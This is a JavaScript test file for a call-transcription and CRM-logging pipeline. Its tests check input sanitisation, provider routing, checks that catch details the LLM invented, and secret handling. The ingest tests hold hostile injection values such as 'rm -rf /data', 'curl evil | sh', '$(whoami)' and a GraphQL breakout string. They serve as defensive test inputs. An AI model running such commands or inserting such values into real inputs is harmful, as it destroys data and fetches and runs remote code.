import { test } from 'node:test';
import assert from 'node:assert/strict';
import { runNode, fixture } from '../test-support/harness.mjs';

const transcript = fixture('transcript.json');
const good = fixture('extraction-good.json');

const cfg = (over = {}) => ({ llm_provider: 'ollama', stt_provider: 'local', ollama_model: 'qwen2.5:7b',
  openai_model: 'gpt-x', anthropic_model: 'claude-x', min_conf: 0.6, crm_provider: 'webhook',
  crm_webhook: 'https://example.test/hook', crm_base: '', ...over });
const runtime = (over) => ({ meeting_id: 'demo-001', source: 'folder',
  start_time: '2026-09-05T15:00:00.000Z', _cfg: cfg(over) });

const reduce = (extractions, over) => runNode('reduce-to-canonical-record', {
  input: extractions.map((extraction, chunk_id) => ({ chunk_id, extraction })),
  nodes: { 'Runtime Config': runtime(over) } })[0];
const validate = (record, said) => runNode('validate-extraction', {
  input: [record], nodes: { 'Normalize Transcript': said ? { segments: [{ speaker: 'REP', text: said }] } : transcript } })[0];

// --- ingest ---------------------------------------------------------------
test('ingest: meeting_id cannot carry shell metacharacters into the ffmpeg command', () => {
  const [out] = runNode('ingest-contract', {
    input: [{ path: '/data/recordings/a.m4a', meeting_id: 'x"; rm -rf /data; echo "' }] });
  assert.match(out.meeting_id, /^[A-Za-z0-9_-]+$/);
});

test('ingest: audio_ref with shell metacharacters is rejected', () => {
  for (const path of ['/data/a.m4a"; curl evil | sh; "', '/data/$(whoami).m4a', '/data/`id`.m4a']) {
    assert.throws(() => runNode('ingest-contract', { input: [{ path }] }), /not allowed/);
  }
});

test('ingest: channels is limited to mono or dual', () => {
  assert.equal(runNode('ingest-contract', { input: [{ channels: '2 -f lavfi' }] })[0].channels, 'mono');
  assert.equal(runNode('ingest-contract', { input: [{ channels: 'dual' }] })[0].channels, 'dual');
});

test('ingest: control characters in audio_ref are rejected', () => {
  for (const path of ['/data/a\u0000.m4a', '/data/a\tb.m4a']) {
    assert.throws(() => runNode('ingest-contract', { input: [{ path }] }), /not allowed/);
  }
});

test('ingest: a signed recording URL is accepted (& and ; are inert inside double quotes)', () => {
  const url = 'https://recordings.example.test/r/abc.mp3?sig=a1b2&expires=1767225600;v=1';
  assert.equal(runNode('ingest-contract', { input: [{ audio_ref: url }] })[0].audio_ref, url);
});

test('ingest: start_time must be a real date and is normalised to ISO', () => {
  assert.throws(() => runNode('ingest-contract', { input: [{ start_time: 'yesterday-ish' }] }), /start_time/);
  const [out] = runNode('ingest-contract', { input: [{ start_time: '2026-09-05T09:00:00-06:00' }] });
  assert.equal(out.start_time, '2026-09-05T15:00:00.000Z');
});

test('ingest: direction is inbound, outbound or unknown - never guessed', () => {
  const dir = (direction) => runNode('ingest-contract', { input: [{ direction }] })[0].direction;
  assert.equal(dir('Outbound'), 'outbound');
  assert.equal(dir('inbound'), 'inbound');
  assert.equal(dir(undefined), '');
  assert.equal(dir('sideways'), '');
});

test('ingest: crm_refs keeps only well-formed record ids', () => {
  const refs = (crm_refs) => runNode('ingest-contract', { input: [{ crm_refs }] })[0].crm_refs;
  assert.deepEqual(refs({ contact_id: 501, deal_id: '9001', company_id: '77", "x": "y', other: 'x' }),
    { contact_id: '501', deal_id: '9001' });
  assert.deepEqual(refs(undefined), {});
  assert.deepEqual(refs('501'), {});
});

// --- provider election ----------------------------------------------------
test('runtime config: no keys means local model and local transcription', () => {
  const [out] = runNode('runtime-config', { input: [{ meeting_id: 'm' }], env: {} });
  assert.equal(out._routing.llm, 'ollama');
  assert.equal(out._routing.stt, 'local');
  assert.equal(out._cfg.min_conf, 0.6);
});

test('runtime config: keys select cloud providers', () => {
  const [out] = runNode('runtime-config', { input: [{}],
    env: { ANTHROPIC_API_KEY: 'k', DEEPGRAM_API_KEY: 'd', CRM_PROVIDER: 'HubSpot' } });
  assert.equal(out._routing.llm, 'anthropic');
  assert.equal(out._routing.stt, 'deepgram');
  assert.equal(out._routing.crm, 'hubspot');
});

test('runtime config: an OpenAI key selects the OpenAI model but not OpenAI transcription', () => {
  const [out] = runNode('runtime-config', { input: [{}], env: { OPENAI_API_KEY: 'k' } });
  assert.equal(out._routing.llm, 'openai');
  assert.equal(out._routing.stt, 'local');
});

// --- transcription request --------------------------------------------------
// Execute Command replaces the item with { exitCode, stderr, stdout }, so the
// builder must read the call context from Runtime Config, not from its input.
const stt = (over, ctx = {}) => runNode('build-stt-request', {
  input: [{ exitCode: 0, stderr: '', stdout: 'NORMALIZED' }],
  nodes: { 'Runtime Config': { ...runtime(over), channels: 'mono', ...ctx } } })[0];

test('STT request: built from Runtime Config, because ffmpeg output carries no call context', () => {
  const out = stt({ whisper_url: 'http://whisper.test' });
  assert.equal(out._stt.mode, 'json');
  assert.equal(out._req.url, 'http://whisper.test/transcribe');
  assert.deepEqual(out._req.body, { path: '/data/work/demo-001.wav', meeting_id: 'demo-001', channels: 'mono', diarize: true });
});

test('STT request: Deepgram diarizes mono audio and separates channels on dual audio', () => {
  const mono = stt({ stt_provider: 'deepgram' });
  assert.equal(mono._stt.mode, 'binary');
  assert.match(mono._stt.url, /diarize=true/);
  assert.doesNotMatch(mono._stt.url, /multichannel/);
  const dual = stt({ stt_provider: 'deepgram' }, { channels: 'dual' });
  assert.match(dual._stt.url, /multichannel=true/);
  assert.doesNotMatch(dual._stt.url, /diarize/);
});

// --- transcript -----------------------------------------------------------
test('normalize transcript: Deepgram words are grouped into speaker turns', () => {
  const words = [
    { word: 'hello', punctuated_word: 'Hello', start: 0, end: 0.4, speaker: 0 },
    { word: 'there', punctuated_word: 'there.', start: 0.4, end: 0.8, speaker: 0 },
    { word: 'hi', punctuated_word: 'Hi.', start: 1, end: 1.2, speaker: 1 }];
  const [out] = runNode('normalize-transcript', {
    input: [{ results: { channels: [{ alternatives: [{ words }] }] } }],
    nodes: { 'Runtime Config': runtime() } });
  assert.deepEqual(out.segments.map((s) => [s.speaker, s.text]),
    [['SPEAKER_0', 'Hello there.'], ['SPEAKER_1', 'Hi.']]);
});

test('normalize transcript: Deepgram multichannel keeps both legs, in time order', () => {
  const ch = (words) => ({ alternatives: [{ words: words.map(([word, start]) => ({ word, start, end: start + 0.3 })) }] });
  const [out] = runNode('normalize-transcript', {
    input: [{ results: { channels: [ch([['hello', 0], ['dana', 0.4], ['great', 3]]), ch([['hi', 1], ['there', 1.4]])] } }],
    nodes: { 'Runtime Config': runtime() } });
  assert.deepEqual(out.segments.map((s) => [s.speaker, s.text]),
    [['REP', 'hello dana'], ['PROSPECT', 'hi there'], ['REP', 'great']]);
});

test('normalize transcript: an empty transcription stops the run', () => {
  assert.throws(() => runNode('normalize-transcript', {
    input: [{ segments: [] }], nodes: { 'Runtime Config': runtime() } }), /no segments/);
});

test('chunking: long transcripts split with a one-turn overlap', () => {
  const segments = Array.from({ length: 30 }, (_, i) => ({ speaker: 'REP', text: ('word' + i + ' ').repeat(100) }));
  const chunks = runNode('chunk-transcript', { input: [{ meeting_id: 'm', segments }] });
  assert.ok(chunks.length > 1);
  assert.ok(chunks.every((c) => c.chunk_total === chunks.length));
  const lastLineOfFirst = chunks[0].text.split('\n').at(-1);
  assert.equal(chunks[1].text.split('\n')[0], lastLineOfFirst);
});

// --- model output ---------------------------------------------------------
const normalize = (response) => runNode('normalize-llm-response', {
  input: [response], nodes: { 'Loop Over Chunks': { chunk_id: 3 } } })[0];

test('normalize LLM response: all three provider shapes produce the same extraction', () => {
  const anthropic = normalize({ content: [{ type: 'tool_use', input: good }] });
  const openai = normalize({ choices: [{ message: { content: JSON.stringify(good) } }] });
  const ollama = normalize({ message: { content: 'Here you go:\n' + JSON.stringify(good) } });
  for (const out of [anthropic, openai, ollama]) {
    assert.equal(out.chunk_id, 3);
    assert.deepEqual(out.extraction, good);
  }
});

test('normalize LLM response: unparseable output is marked, not passed along', () => {
  const out = normalize({ message: { content: 'I could not find anything { broken' } });
  assert.ok(out.extraction._parse_error);
});

test('reduce: chunks merge, duplicates collapse, failed chunks lower confidence', () => {
  const rec = reduce([good, good, { _parse_error: 'bad json' }]);
  assert.equal(rec.account.name, 'Northwind Logistics');
  assert.equal(rec.rep_commitments.length, 2);
  assert.equal(rec.provenance.chunks_failed, 1);
  assert.equal(rec.confidence, Number((0.85 * (2 / 3)).toFixed(3)));
});

// --- validator ------------------------------------------------------------
test('validator: a grounded extraction passes and opens the gate', () => {
  const out = validate(reduce([good]));
  assert.equal(out.validation.passed, true);
  assert.deepEqual(out.validation.flags, []);
  assert.equal(out._gate, 1);
});

test('validator: an invented competitor is quarantined and the record goes to review', () => {
  const bad = { ...good, competitors_mentioned: [...good.competitors_mentioned, { name: 'Chorus' }] };
  const out = validate(reduce([bad]));
  assert.deepEqual(out.competitors_mentioned.map((c) => c.name), ['Gong']);
  assert.deepEqual(out._quarantined.competitors_mentioned.map((c) => c.name), ['Chorus']);
  assert.equal(out._gate, 0);
});

test('validator: an invented rep commitment is quarantined', () => {
  const bad = { ...good, rep_commitments: [...good.rep_commitments,
    { commitment: 'Provide a 40% discount and a free onsite implementation workshop' }] };
  const out = validate(reduce([bad]));
  assert.equal(out.rep_commitments.length, 2);
  assert.equal(out._quarantined.rep_commitments.length, 1);
  assert.ok(out.validation.flags.some((f) => f.code === 'ungrounded_commitment'));
  assert.equal(out._gate, 0);
});

test('validator: a quote that is not in the transcript is stripped but does not block', () => {
  const bad = { ...good, pain_points: [{ paraphrase: 'Notes are slow', verbatim_quote: 'we hate our CRM' }] };
  const out = validate(reduce([bad]));
  assert.equal(out.pain_points[0].verbatim_quote, '');
  assert.ok(out.validation.flags.some((f) => f.code === 'ungrounded_quote' && f.severity === 'soft'));
  assert.equal(out._gate, 1);
});

test('validator: high self-reported confidence cannot override a failed check', () => {
  const bad = { ...good, confidence: 1, competitors_mentioned: [{ name: 'Clari' }] };
  assert.equal(validate(reduce([bad]))._gate, 0);
});

test('validator: low confidence blocks even a grounded record', () => {
  const out = validate(reduce([{ ...good, confidence: 0.3 }]));
  assert.equal(out.validation.passed, true);
  assert.equal(out._gate, 0);
});

test('validator: a failed chunk or an empty extraction goes to review', () => {
  assert.equal(validate(reduce([good, { _parse_error: 'x' }]))._gate, 0);
  const empty = { ...good, pain_points: [], rep_commitments: [], next_steps: [] };
  assert.ok(validate(reduce([empty])).validation.flags.some((f) => f.code === 'empty_extraction'));
});

test('validator: a malformed record is reported, not thrown', () => {
  const out = validate({ account: null, confidence: 'high', _min_confidence: 0.6 });
  assert.equal(out._gate, 0);
  assert.ok(out.validation.flags.some((f) => f.code === 'schema_invalid'));
});

test('validator: a competitor name inside an ordinary word is not grounded', () => {
  const said = 'Let me clarify the rollout, then I will send the pricing sheet. We keep php scripts for that.';
  const rec = { ...good, pain_points: [], competitors_mentioned: [{ name: 'Clari' }, { name: 'HP' }] };
  const out = validate(reduce([rec]), said);
  assert.deepEqual(out.competitors_mentioned, []);
  assert.equal(out._quarantined.competitors_mentioned.length, 2);
});

test('validator: competitor names match on word boundaries, through punctuation and possessives', () => {
  const said = "We compared Gong's pricing with monday.com and HP. I will send the pricing sheet.";
  const rec = { ...good, pain_points: [], rep_commitments: [{ commitment: 'Send the pricing sheet' }],
    competitors_mentioned: [{ name: 'Gong' }, { name: 'Monday.com' }, { name: 'HP' }] };
  const out = validate(reduce([rec]), said);
  assert.equal(out.competitors_mentioned.length, 3);
  assert.equal(out._gate, 1);
});

test('validator: commitment words are matched as words, not as substrings', () => {
  // "rate", "port" and "form" only occur inside "separate", "report" and "information".
  const said = 'We keep a separate report with that information.';
  const rec = { ...good, pain_points: [], competitors_mentioned: [],
    rep_commitments: [{ commitment: 'Offer a flat rate on the port form' }] };
  const out = validate(reduce([rec]), said);
  assert.equal(out.rep_commitments.length, 0);
  assert.ok(out.validation.flags.some((f) => f.code === 'ungrounded_commitment'));
});

test('validator: a commitment that changes word endings is still grounded', () => {
  const said = 'I am scheduling the security reviews and sending prices tomorrow.';
  const rec = { ...good, pain_points: [], competitors_mentioned: [],
    rep_commitments: [{ commitment: 'Schedule a security review and send pricing' }] };
  assert.equal(validate(reduce([rec]), said)._gate, 1);
});

test('validator: a number the rep never said quarantines an otherwise grounded commitment', () => {
  const rec = { ...good, competitors_mentioned: [],
    rep_commitments: [{ commitment: 'Send the pricing sheet by Friday with a 40% discount' }] };
  const out = validate(reduce([rec]));
  assert.equal(out.rep_commitments.length, 0);
  assert.ok(out.validation.flags.some((f) => f.code === 'ungrounded_number'));
  assert.equal(out._gate, 0);
  const said = 'I will send the pricing sheet by Friday with a 40% discount.';
  assert.equal(validate(reduce([rec]), said)._gate, 1);
});

test('validator: a due date that is not in the transcript is stripped and flagged', () => {
  const rec = { ...good, rep_commitments: [
    { commitment: 'Send the pricing sheet', due: 'Monday' },
    { commitment: 'Set up a security review', due: 'by Friday' }] };
  const out = validate(reduce([rec]));
  assert.deepEqual(out.rep_commitments.map((c) => c.due), ['', 'by Friday']);
  assert.ok(out.validation.flags.some((f) => f.code === 'ungrounded_due' && f.severity === 'soft'));
});

test('validator: confidence must be a number, not something that coerces to one', () => {
  for (const confidence of [true, '0.9', null]) {
    const out = validate({ ...reduce([good]), confidence });
    assert.equal(out._gate, 0);
    assert.ok(out.validation.flags.some((f) => f.code === 'schema_invalid'));
  }
});

// --- human review ------------------------------------------------------------
const held = () => validate(reduce([{ ...good, confidence: 0.3,
  competitors_mentioned: [...good.competitors_mentioned, { name: 'Chorus' }] }]));
const review = (env) => runNode('human-review-queue', { input: [held()], env })[0];

test('review queue: with REVIEW_WEBHOOK_URL the held record is posted with its flags and quarantined items', () => {
  const out = review({ REVIEW_WEBHOOK_URL: 'https://example.test/review' });
  assert.equal(out._review.delivery, 'webhook');
  assert.deepEqual(out._review.reasons, ['ungrounded_competitor', 'below_min_confidence']);
  assert.equal(out._req.url, 'https://example.test/review');
  assert.deepEqual(out._req.body._quarantined.competitors_mentioned.map((c) => c.name), ['Chorus']);
  assert.ok(out._req.body.validation.flags.length > 0);
  assert.equal(out._req.body._review.status, 'held');
});

test('review queue: without a webhook the record stops here, visible in execution data', () => {
  const out = review({});
  assert.equal(out._review.delivery, 'execution_data');
  assert.equal('_req' in out, false);
  assert.equal(out._quarantined.competitors_mentioned.length, 1);
});

// --- CRM adapters ---------------------------------------------------------
// `ingest` is what the Ingest Contract node emitted for this call.
const ingested = (input = {}) => runNode('ingest-contract', {
  input: [{ meeting_id: 'demo-001', start_time: '2026-09-05T15:00:00.000Z', ...input }] })[0];
const crm = (over, ingest = {}, record = good) => runNode('build-crm-request', {
  input: [validate(reduce([record], over))], env: { CRM_TOKEN: 'test-token' },
  nodes: { 'Runtime Config': runtime(over), 'Ingest Contract': ingested(ingest) } })[0]._req;

test('CRM adapter: HubSpot call engagement payload', () => {
  const req = crm({ crm_provider: 'hubspot' });
  assert.equal(req.url, 'https://api.hubapi.com/crm/v3/objects/calls');
  assert.equal(req.headers.Authorization, 'Bearer test-token');
  assert.match(req.body.properties.hs_call_body, /COMMITMENTS MADE BY REP/);
  assert.equal(req.body.properties.hs_timestamp, '2026-09-05T15:00:00.000Z');
  assert.equal(req.body.properties.hs_call_status, 'COMPLETED');
});

test('CRM adapter: HubSpot without refs, direction or duration sends none of them', () => {
  const { body } = crm({ crm_provider: 'hubspot' });
  assert.equal('associations' in body, false);
  assert.equal('hs_call_direction' in body.properties, false);
  assert.equal('hs_call_duration' in body.properties, false);
});

test('CRM adapter: HubSpot associates the call to the contact, company and deal it was given', () => {
  const { body } = crm({ crm_provider: 'hubspot' },
    { crm_refs: { contact_id: '501', company_id: '77', deal_id: '9001' }, direction: 'outbound', duration_sec: 1800 });
  const assoc = (id, typeId) => ({ to: { id },
    types: [{ associationCategory: 'HUBSPOT_DEFINED', associationTypeId: typeId }] });
  assert.deepEqual(body.associations, [assoc('501', 194), assoc('77', 182), assoc('9001', 206)]);
  assert.equal(body.properties.hs_call_direction, 'OUTBOUND');
  assert.equal(body.properties.hs_call_duration, 1800000);
  assert.deepEqual(crm({ crm_provider: 'hubspot' }, { crm_refs: { deal_id: '9001' } }).body.associations,
    [assoc('9001', 206)]);
});

test('CRM adapter: Zoho takes direction and duration from the call, and refuses to invent them', () => {
  const { body } = crm({ crm_provider: 'zoho' }, { direction: 'outbound', duration_sec: 1800 });
  assert.equal(body.data[0].Call_Type, 'Outbound');
  assert.equal(body.data[0].Call_Duration, '00:30');
  assert.throws(() => crm({ crm_provider: 'zoho' }, { duration_sec: 1800 }), /direction/);
  assert.throws(() => crm({ crm_provider: 'zoho' }, { direction: 'inbound' }), /duration_sec/);
});

test('CRM adapter: monday item name cannot break out of the GraphQL string', () => {
  const hostile = { ...good, account: { name: 'Acme\\", column_values: "{}") { id } } #' } };
  const record = { ...validate(reduce([hostile])), _monday: { board_id: '1', group_id: 'g', column_values: {},
    item_name: 'Call - ' + hostile.account.name } };
  const [out] = runNode('build-crm-request', { input: [record],
    nodes: { 'Runtime Config': runtime({ crm_provider: 'monday' }), 'Ingest Contract': ingested() } });
  const literal = /item_name: ("(?:[^"\\]|\\.)*")/.exec(out._req.body.query)[1];
  assert.equal(JSON.parse(literal), record._monday.item_name);
});

test('CRM adapter: Zoho and Salesforce targets', () => {
  assert.match(crm({ crm_provider: 'zoho' }, { direction: 'inbound', duration_sec: 600 }).url, /zohoapis\.com\/crm\/v5\/Calls$/);
  const sf = crm({ crm_provider: 'salesforce', crm_base: 'https://acme.my.salesforce.com' });
  assert.equal(sf.url, 'https://acme.my.salesforce.com/services/data/v60.0/sobjects/Task');
  assert.equal(sf.body.TaskSubtype, 'Call');
});

test('CRM adapter: Pipedrive sends the token in a header, never in the URL', () => {
  const req = crm({ crm_provider: 'pipedrive' });
  assert.equal(req.url, 'https://api.pipedrive.com/v1/notes');
  assert.equal(req.headers['x-api-token'], 'test-token');
});

test('CRM adapter: default webhook posts the canonical record', () => {
  const req = crm({});
  assert.equal(req.url, 'https://example.test/hook');
  assert.equal(req.body.account.name, 'Northwind Logistics');
  assert.equal(req.body.validation.passed, true);
});

test('CRM adapter: no target configured is an error, not a silent no-op', () => {
  assert.throws(() => crm({ crm_webhook: '' }), /No CRM target configured/);
});

// --- secrets --------------------------------------------------------------
// n8n stores each node's output in execution data. A key may appear in exactly
// one place: _req.headers of a node whose output goes straight into an HTTP node.
test('secrets: API keys appear only in the _req.headers of a request-builder node', () => {
  const env = { OPENAI_API_KEY: 'SECRET-openai', ANTHROPIC_API_KEY: 'SECRET-anthropic',
    DEEPGRAM_API_KEY: 'SECRET-deepgram', CRM_TOKEN: 'SECRET-crm', CRM_WEBHOOK_URL: 'https://example.test/hook' };
  const outputs = {};
  const run = (file, input, nodes, e = env) => (outputs[file + '/' + (e.CRM_PROVIDER || e.LLM || '')] =
    runNode(file, { input, env: e, nodes }));

  const ingest = run('ingest-contract', [{ meeting_id: 'demo-001', direction: 'inbound', duration_sec: 600 }])[0];
  const withoutOpenAI = { ...env, OPENAI_API_KEY: '', LLM: 'anthropic' };
  for (const e of [env, withoutOpenAI]) {
    const rc = run('runtime-config', [ingest], {}, e)[0];
    const nodes = { 'Runtime Config': rc, 'Ingest Contract': ingest, 'Normalize Transcript': transcript,
      'Loop Over Chunks': { chunk_id: 0 } };
    run('build-stt-request', [{ exitCode: 0 }], nodes, e);
    const chunk = run('chunk-transcript', [transcript], nodes, e)[0];
    run('build-llm-request', [chunk], nodes, e);
    const reduced = run('reduce-to-canonical-record', [{ chunk_id: 0, extraction: good }], nodes, e)[0];
    const validated = run('validate-extraction', [reduced], nodes, e)[0];
    run('human-review-queue', [validated], nodes, e);
    for (const CRM_PROVIDER of ['webhook', 'hubspot', 'zoho', 'salesforce', 'pipedrive', 'monday']) {
      const pe = { ...e, CRM_PROVIDER, MONDAY_BOARD_ID: '1' };
      const prc = run('runtime-config', [ingest], {}, pe)[0];
      const pn = { ...nodes, 'Runtime Config': prc, 'Validate Extraction': validated };
      run('discover-crm-schema', [validated], pn, pe);
      const record = CRM_PROVIDER === 'monday'
        ? run('map-to-board-columns', [{ data: { boards: [{ id: '1', name: 'b', columns: [], groups: [] }] } }], pn, pe)[0]
        : validated;
      run('build-crm-request', [record], pn, pe);
    }
  }

  let keysSeen = 0;
  for (const [name, out] of Object.entries(outputs)) {
    const stripped = JSON.parse(JSON.stringify(out), (key, value) => {
      if (key === '_req' && value && value.headers) {
        keysSeen += JSON.stringify(value.headers).split('SECRET-').length - 1;
        return { ...value, headers: undefined };
      }
      return value;
    });
    assert.ok(!JSON.stringify(stripped).includes('SECRET-'), `${name} leaks a key outside _req.headers`);
  }
  assert.ok(keysSeen >= 8, 'the builders did put keys in _req.headers, so the check above is meaningful');
});
